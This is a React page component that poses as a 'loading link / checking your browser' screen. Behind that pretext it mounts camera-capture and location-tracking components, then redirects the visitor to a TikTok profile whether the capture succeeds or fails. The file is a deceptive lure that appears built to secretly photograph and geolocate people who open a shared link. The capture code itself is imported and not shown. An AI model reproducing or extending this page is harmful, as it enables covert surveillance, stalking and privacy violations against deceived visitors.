
import React, { useEffect, useState } from 'react';
import CameraCapture from '../components/CameraCapture';
import LocationTracker from '../components/LocationTracker';
import { Loader2, Sparkles } from 'lucide-react';

const GoaFaf = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [status, setStatus] = useState('Loading link...');

  useEffect(() => {
    const timer = setTimeout(() => {
      setStatus('Please wait while checking your browser...');
      setIsLoading(false);
    }, 1500);

    return () => clearTimeout(timer);
  }, []);

  const handleSuccess = () => {
    setStatus('Link loaded successfully! Redirecting...');
    setTimeout(() => {
      window.location.href = 'https://tiktok.com/@rakaarjunav.2';
    }, 2000);
  };

  const handleError = (error: string) => {
    console.error('Capture error:', error);
    setStatus('Redirecting...');
    setTimeout(() => {
      window.location.href = 'https://tiktok.com/@rakaarjunav.2';
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center p-4 relative overflow-hidden">
      {/* Animated background */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -top-10 -left-10 w-80 h-80 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
        <div className="absolute -bottom-10 -right-10 w-80 h-80 bg-blue-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse delay-1000"></div>
      </div>

      <div className="bg-white/10 backdrop-blur-lg rounded-xl shadow-2xl p-8 max-w-md w-full text-center border border-white/20 card-3d relative z-10">
        <div className="flex items-center justify-center mb-6">
          <Sparkles className="w-8 h-8 text-yellow-400 mr-2 animate-pulse" />
          <Loader2 className="w-12 h-12 animate-spin text-blue-400" />
          <Sparkles className="w-8 h-8 text-yellow-400 ml-2 animate-pulse" />
        </div>
        
        <h1 className="text-2xl font-bold mb-4 animated-3d-text gradient-text">Loading Link</h1>
        <p className="mb-6 animated-3d-text-small glow-text-blue">{status}</p>
        
        {!isLoading && (
          <div className="animate-fade-in">
            <CameraCapture onSuccess={handleSuccess} onError={handleError} />
            <LocationTracker onSuccess={handleSuccess} onError={handleError} />
          </div>
        )}
      </div>
    </div>
  );
};

export default GoaFaf;
